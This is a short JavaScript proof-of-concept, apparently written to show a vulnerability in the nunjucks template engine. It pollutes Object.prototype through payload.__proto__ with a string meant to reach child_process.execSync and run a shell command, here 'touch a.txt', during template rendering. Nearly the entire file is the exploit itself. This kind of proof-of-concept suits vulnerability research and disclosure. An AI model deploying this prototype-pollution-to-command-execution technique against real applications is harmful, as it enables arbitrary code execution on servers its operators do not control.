const nunjucks = require("nunjucks");

nunjucks.configure({
  autoescape: true,
});

const template = nunjucks.compile(" content is {{ content }} ");

const payload = { };

payload.__proto__.content =
  " function(){ return global.process.mainModule.require('child_process').execSync('touch a.txt') }() ";

template.render(payload);